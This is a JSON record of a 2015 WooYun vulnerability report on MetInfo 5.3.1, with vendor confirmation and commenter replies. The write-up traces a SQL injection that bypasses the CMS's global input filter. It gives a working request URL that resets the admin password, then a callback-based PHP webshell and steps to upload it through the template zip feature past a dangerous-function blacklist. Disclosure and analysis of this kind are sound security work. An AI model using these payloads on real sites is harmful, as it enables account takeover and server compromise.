{"id": 67050, "wybug_id": "wooyun-2015-0134479", "wybug_title": "metinfo 5.3.1 注入漏洞（无视全局防御）+后台getshell", "wybug_corp": "MetInfo", "wybug_author": "淡蓝色の忧伤", "wybug_date": "2015-08-17 10:55", "wybug_open_date": "2015-11-15 11:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-20：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-15：\t细节向公众公开  简要描述： 发后台getshell，审核不给过，说要后台权限，那我就给你后台权限O(∩_∩)O哈 详细说明：  注入触发点/admin/include/global.func.php 1456行save_met_cookie函数\nfunction save_met_cookie(){\tglobal $met_cookie,$db,$met_admin_table;\t$met_cookie['time']=time();\t$json=json_encode($met_cookie);\t$username=$met_cookie[metinfo_admin_id]?$met_cookie[metinfo_admin_id]:$met_cookie[metinfo_member_id];\t$username=daddslashes($username,0,1);\t$query=\"update $met_admin_table set cookie='$json' where id='$username'\";\t$user=$db->query($query);}\n$json=json_encode($met_cookie); 将$met_cookie转为json格式，存入数据库；这里说明一下，json_encode 会吃掉转移符\\，当我们引入单引号的时候 json 吃掉了 单引号的转译符\\ ,所以在进入SQL语句的时候我们能保留 单引号 ',有了单引号一切就好办了。而且这个语句处理的是 met_admin_table 表，是管理员表。我们看看$met_cookiemetinfo 采用伪全局变量机制在/admin/include/common.inc.php 第76行\n$met_cookie_filter=$met_cookie;foreach(array('_COOKIE', '_POST', '_GET') as $_request) {\tforeach($$_request as $_key => $_value) {\t\t$_key{0} != '_' && $$_key = daddslashes($_value,0,0,1);\t\t$_M['form'][$_key]=daddslashes($_value,0,0,1);\t}}$met_cookie=array();$met_cookie=$met_cookie_filter;$settings=array();$db_settings=array();$db_settings = parse_ini_file(ROOTPATH.'config/config_db.php');@extract($db_settings);\n这里对$met_cookie 的处理，真是笑死了，只需要对$met_cookie_filter进行赋值还是能影响$met_cookie 我们看看daddslashes函数怎么处理的/admin/include/global.func.php 注意是后台，前台也有个daddslashes函数但是代码不一样\nfunction daddslashes($string, $force = 0 ,$sql_injection =0,$url =0){\t!defined('MAGIC_QUOTES_GPC') && define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());\tif(!MAGIC_QUOTES_GPC || $force) {\t\tif(is_array($string)) {\t\t\tforeach($string as $key => $val) {\t\t\t\t$string[$key] = daddslashes($val, $force);\t\t\t}\t\t} else {\t\t\t$string = addslashes($string);\t\t}\t}\tif(is_array($string)){\t\tif($url){\t\t\t//$string='';\t\t\tforeach($string as $key => $val) {\t\t\t\t$string[$key] = daddslashes($val, $force);\t\t\t}\t\t}else{\t\t\tforeach($string as $key => $val) {\t\t\t\t$string[$key] = daddslashes($val, $force);\t\t\t}\t\t}\t}else{\t\tif(SQL_DETECT!=1 || $sql_injection==1){\t\t\t$string = str_ireplace(\"\\\"\",\"/\",$string);\t\t\t$string = str_ireplace(\"'\",\"/\",$string);\t\t\t$string = str_ireplace(\"*\",\"/\",$string);\t\t\t$string = str_ireplace(\"~\",\"/\",$string);\t\t\t$url = str_ireplace(\"\\\"\",\"/\",$url);\t\t\t$url = str_ireplace(\"'\",\"/\",$url);\t\t\t$url = str_ireplace(\"*\",\"/\",$url);\t\t\t$url = str_ireplace(\"~\",\"/\",$url);\t\t\t$string = str_ireplace(\"select\", \"\\sel\\ect\", $string);\t\t\t$string = str_ireplace(\"insert\", \"\\ins\\ert\", $string);\t\t\t$string = str_ireplace(\"update\", \"\\up\\date\", $string);\t\t\t$string = str_ireplace(\"delete\", \"\\de\\lete\", $string);\t\t\t$string = str_ireplace(\"union\", \"\\un\\ion\", $string);\t\t\t$string = str_ireplace(\"into\", \"\\in\\to\", $string);\t\t\t$string = str_ireplace(\"load_file\", \"\\load\\_\\file\", $string);\t\t\t$string = str_ireplace(\"outfile\", \"\\out\\file\", $string);\t\t\t$string = str_ireplace(\"sleep\", \"\\sle\\ep\", $string);\t\t\t$string = str_ireplace(\"where\", \"\\where\", $string);\t\t\t$string_html=$string;\t\t\t$string = strip_tags($string);\t\t\tif($string_html!=$string){\t\t\t\t$string='';\t\t\t}\t\t\t$string = str_replace(\"%\", \"\\%\", $string);     //   \t\t}\t}\treturn $string;}\n(SQL_DETECT!=1 || $sql_injection==1)当满足这个条件时才过滤关键字，否则只是用addslashes处理， sql_injection默认为 0 ，我们找 SQL_DETECT在admin/login/login.check.php第9行 定义了define('SQL_DETECT',1);\nif($depth!=''&&$depth!='../'&&$depth!='../../'){die();}if(!isset($depth))$depth='';$commonpath=$depth.'include/common.inc.php';$commonpath=$admin_index?$commonpath:'../'.$commonpath;define('SQL_DETECT',1);require_once $commonpath;\n所以只要在这里引入的变量都只是使用addslashes 处理而save_met_cookie函数又能得到单引号，我们这样就绕过了metinfo的防御了。现在找一下漏洞触发点从上面的代码可以看到 在admin/login/login.check.php 中引入admin/include/common.inc.php而在 admin/include/common.inc.php文件的最后引入了metlist.php 在metlist.php 第91行左右\nif(!$shortcut_list){\t$shortcut_list[0]=array('name'=>'lang_skinbaseset','url'=>'system/basic.php?anyid=9&lang=cn','bigclass'=>'1','field'=>'s1001','type'=>'2','list_order'=>'10','protect'=>'1','hidden'=>'0');\t$shortcut_list[1]=array('name'=>'lang_indexcolumn','url'=>'column/index.php?anyid=25&lang=cn','bigclass'=>'1','field'=>'s1201','type'=>'2','list_order'=>'0','protect'=>'1','hidden'=>'0');\t$shortcut_list[2]=array('name'=>'lang_unitytxt_75','url'=>'interface/skin_editor.php?anyid=18&lang=cn','bigclass'=>'1','field'=>'s1101','type'=>'2','list_order'=>'0','protect'=>'1','hidden'=>'0');\t$shortcut_list[3]=array('name'=>'lang_tmptips','url'=>\"interface/info.php?anyid=24&lang=cn\",'bigclass'=>'1','field'=>'s1101','type'=>'2','list_order'=>'0','protect'=>'1','hidden'=>'0');\tchange_met_cookie('metinfo_admin_shortcut',$shortcut_list);\tsave_met_cookie();\t$query=\"update $met_admin_table set admin_shortcut='\".json_encode($shortcut_list).\"' where admin_id='$metinfo_admin_name'\";\t$db->query($query);}\n我们看到调用了 save_met_cookie()函数;   漏洞证明：  因为没有回显，就把$query 输出好证明。因为save_met_cookie函数中的数据表是管理员表，我们可以直接把管理员密码改了O(∩_∩)O哈哈~访问/admin/login/login_check.php?met_cookie_filter[a]=a%27,admin_pass=md5(1234567)+where+id=1;+%23--\n\n这样就可以吧管理员密码改为12345678当然利用不止这些(⊙o⊙)哦，毕竟我们已经绕过了防御。现在后台getshellgetshel admin\\include\\uploadify.php 206行 \nelseif($type=='skin'){/*模板文件*/\t$filetype=explode('.',$_FILES['Filedata']['name']);\tif($filetype[count($filetype)-1]=='zip'){\t\tif(stristr($met_file_format,'zip') === false){\t\t\techo $lang_jsx36;\t\t\tdie();\t\t}\t\t//if(!is_writable('../../templates/'))@chmod('../../templates/',0777);\t\t$filenamearray=explode('.zip',$_FILES['Filedata']['name']);\t    $skin_if=$db->get_one(\"SELECT * FROM {$met_skin_table} WHERE skin_file='{$filenamearray[0]}'\");\t    if($skin_if){\t\t\t$metinfo=$lang_loginSkin;\t\t}else{\t\t\t$f = new upfile('zip','../../templates/','','');\t\t\tif($f->get_error()){\t\t\t\techo $f->get_errorcode();\t\t\t\tdie();\t\t\t}\t\t\tif(file_exists('../../templates/'.$filenamearray[0].'.zip'))$filenamearray[0]='metinfo'.$filenamearray[0];\t\t\t$met_upsql = $f->upload('Filedata',$filenamearray[0]); \t\t\tinclude \"pclzip.lib.php\";\t\t\t$archive = new PclZip('../../templates/'.$filenamearray[0].'.zip');\t\t\t\t\tif($archive->extract(PCLZIP_OPT_PATH, '../../templates/') == 0)$metinfo=$archive->errorInfo(true);\t\t\t$list = $archive->listContent();\t\t\t$error=0;\t\t\tforeach($list as $key=>$val){\t\t\t\tif(preg_match(\"/\\.(asp|aspx|jsp)/i\",$val[filename])){\t\t\t\t\t$error=1;\t\t\t\t}\t\t\t\tif(!is_dir('../../templates/'.$val[filename])&&preg_match(\"/\\.(php)/i\",$val[filename])){\t\t\t\t\t$danger=explode('|','preg_replace|assert|dirname|file_exists|file_get_contents|file_put_contents|fopen|mkdir|unlink|readfile|eval|cmd|passthru|system|gzuncompress|exec|shell_exec|fsockopen|pfsockopen|proc_open|scandir');\t\t\t\t\t$ban='preg_replace|assert|eval|\\$_POST|\\$_GET';\t\t\t\t\tforeach($danger as $key1 => $val1){\t\t\t\t\t\t\t\t\t\t\t$str=file_get_contents('../../templates/'.$val[filename]);\t\t\t\t\t\t$str=str_replace(array('\\'','\"','.'),'',$str);\t\t\t\t\t\tif(preg_match(\"/([^A-Za-z0-9_]$val1)[\\r\\n\\t]{0,}([\\[\\(])/i\",$str)){\t\t\t\t\t\t\t\t$error=1;\t\t\t\t\t\t}\t\t\t\t\t\tif(preg_match('/('.$ban.')/i',$str)){\t\t\t\t\t\t\t\t$error=1;\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t\t@unlink('../../templates/'.$filenamearray[0].'.zip');\t\t\tif($error){\t\t\t\tforeach($list as $key=>$val){\t\t\t\t\tif(is_dir('../../templates/'.$val[filename])){\t\t\t\t\t\t@deldir('../../templates/'.$val[filename]);\t\t\t\t\t}else{\t\t\t\t\t\t@unlink('../../templates/'.$val[filename]);\t\t\t\t\t}\t\t\t\t}\t\t\t\t$metinfo='含有危险函数，禁止上传！！';\t\t\t}else{\t\t\t\t$metinfo='1$'.$filenamearray[0];\t\t\t}\t\t}\n 上传.zip 文件会自动解压，不过有过滤，但是是 采用黑名单方式，用回调函数可以轻易绕过 如下面的一句话 <?php $e = $_REQUEST['e']; $arr = array($_REQUEST['pass'],); array_filter($arr, base64_decode($e)); ?> 接下来是利用 把上面的码写进test.php文件里压缩为test.zip格式 在后台找个能上传的的地方上传, 修改参数 type=skin 上传成功后在/templates目录下生成 test.php   修复方案：  看我写的怎么辛苦，求高rank，求 $$.   版权声明：转载请注明来源 淡蓝色の忧伤@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-08-17 11:23 厂商回复： 后续版本修复！感谢您的反馈！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-17 10:57 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  good    \n     2015-08-17 11:04 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  叼    \n     2015-08-17 11:13 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:798 漏洞数:99        )\t\t \n  nice    \n     2015-08-17 14:28 |    \t\tanswer \t\t\t( 普通白帽子  |\t\t\t        Rank:367 漏洞数:47        | 答案)\t\t \n  nice    \n     2015-08-17 19:22 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:764 漏洞数:147        | http://menmen519.blog.sohu.com/)\t\t \n  为何这么屌    \n     2015-08-17 20:09 |    \t\tManning \t\t\t( 普通白帽子  |\t\t\t        Rank:629 漏洞数:87        | https://github.com/manning23/MSpider)\t\t \n  666    \n     2015-08-20 14:53 |    \t\t乌云合作伙伴-绿盟(乌云厂商)\t\t \n  我觉得这个洞价值$$$加闪电    \n     2015-08-20 15:42 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:764 漏洞数:147        | http://menmen519.blog.sohu.com/)\t\t \n  @乌云合作伙伴-绿盟 这个估计比较难，后台你也得先找到 除非前台直接shell    \n     2015-10-17 11:04 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1721 漏洞数:255        | 我有个2b女友！)\t\t \n  good    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}